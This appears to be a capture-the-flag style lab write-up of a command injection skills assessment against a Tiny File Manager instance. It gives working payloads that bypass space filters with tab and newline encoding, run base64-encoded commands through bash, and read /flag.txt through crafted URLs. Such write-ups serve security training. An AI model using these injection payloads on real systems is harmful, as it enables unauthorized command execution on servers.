  <h1>Command Injection<br>Skills Assessment</h1>

  <p class="subtitle">Exploiting a blind command injection vulnerability through a file manager interface using filter bypass techniques.</p>

  <div class="content">

    <!-- RECON -->
    <h2>Reconnaissance</h2>

    <p>For this skills assessment we are provided with an IP address and credentials to log into a webpage. Doing so, we land on the <strong>Tiny File Manager</strong> page.</p>

    <p>From the folder structure we can determine that the server runs on a Unix system. The file manager allows us to view, copy and move files around the server. In some situations we are confronted with the error <em>"Malicious request denied!"</em> — a message that can potentially reflect the output of our injection attempts.</p>

    <p>After examining the URL structure, we expect the back-end command to resemble something like:</p>

    <div class="code-label">Inferred back-end PHP</div>
    <pre><code>php shell_exec("mv " . $_GET['from'] . " " . $_GET['to']);</code></pre>

    <!-- TESTING -->
    <h2>Confirming the Vulnerability</h2>

    <p>We test the parameters with a <code>sleep</code> command, similar to time-based SQL injection:</p>

    <div class="code-label">Initial probe</div>
    <pre><code>;sleep 5</code></pre>

    <p>We find that spaces are filtered. To bypass this, we substitute the tab character (<code>%09</code>) in their place:</p>

    <div class="code-label">Time-based blind injection</div>
    <pre class="url"><code>http://154.57.164.73:31564/index.php?to=%3Bsleep%095&amp;from=51459716.txt&amp;finish=1&amp;move=1</code></pre>

    <div class="callout">
      <strong>Result</strong>
      The page freezes for exactly 5 seconds, confirming the command injection vulnerability.
    </div>

    <!-- ENUMERATION -->
    <h2>Enumeration via Base64 Encoding</h2>

    <p>With spaces filtered, we craft payloads using base64 encoding to avoid problematic characters entirely. First, we encode a <code>whoami</code> command and verify it executes correctly:</p>

    <div class="code-label">Encode the command locally</div>
    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66🔥]─(3v3r7@Athena)
╰─>[👾]~ $ echo -n 'whoami' | base64
d2hvYW1p</code></pre>

    <div class="code-label">Payload structure</div>
    <pre><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;d2hvYW1p)</code></pre>

    <div class="code-label">Validate locally</div>
    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66🔥]─(3v3r7@Athena)
╰─>[👾]~ $ bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;d2hvYW1p)
3v3r7</code></pre>

    <p>To terminate the preceding command before our injection, we prepend a newline (<code>%0a</code>), semicolon (<code>%3B</code>), or pipe (<code>%7C</code>). The final injection URL looks like:</p>

    <div class="code-label">Whoami via HTTP</div>
    <pre class="url"><code>http://154.57.164.73:31564/index.php?to=%3Bbash%3C%3C%3C$(base64%09-d%3C%3C%3Cd2hvYW1p)&amp;from=51459716.txt&amp;finish=1&amp;move=1</code></pre>
    <img src="/assets/img/1_xhEc1_SucvR4sdL5wHTL9w.png" alt="Command output reflected in error message" style="width:100%; border-radius:4px; border:1px solid #252830;">
  
    <div class="callout">
      <strong>Result</strong>
      The output of <code>whoami</code> is reflected in the error message on the page.
    </div>

    <!-- FLAG -->
    <h2>Capturing the Flag</h2>

    <p>The assessment specifies that the flag is located at <code>/flag.txt</code>, making the final payload straightforward to construct:</p>

    <div class="code-label">Encode the read command</div>
    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66🔥]─(3v3r7@Athena)
╰─>[👾]~ $ echo -n 'cat /flag.txt' | base64
Y2F0IC9mbGFnLnR4dA==</code></pre>

    <div class="code-label">Payload</div>
    <pre><code>%0abash&lt;&lt;&lt;$(base64%09-d&lt;&lt;&lt;Y2F0IC9mbGFnLnR4dA==)</code></pre>

    <div class="code-label">Final request</div>
    <pre class="url"><code>http://154.57.164.73:31564/index.php?to=%0abash%3C%3C%3C$(base64%09-d%3C%3C%3CY2F0IC9mbGFnLnR4dA==)&amp;from=51459716.txt&amp;finish=1&amp;move=1</code></pre>

    <div class="callout">
      <strong>Result</strong>
      The flag is reflected in the error message. Assessment complete.
    </div>

    <img src="/assets/img/1_SLqu9187nk5X2qoB0RBwSA.png" alt="Flag reflected in error message" style="width:100%; border-radius:4px; border:1px solid #252830;">

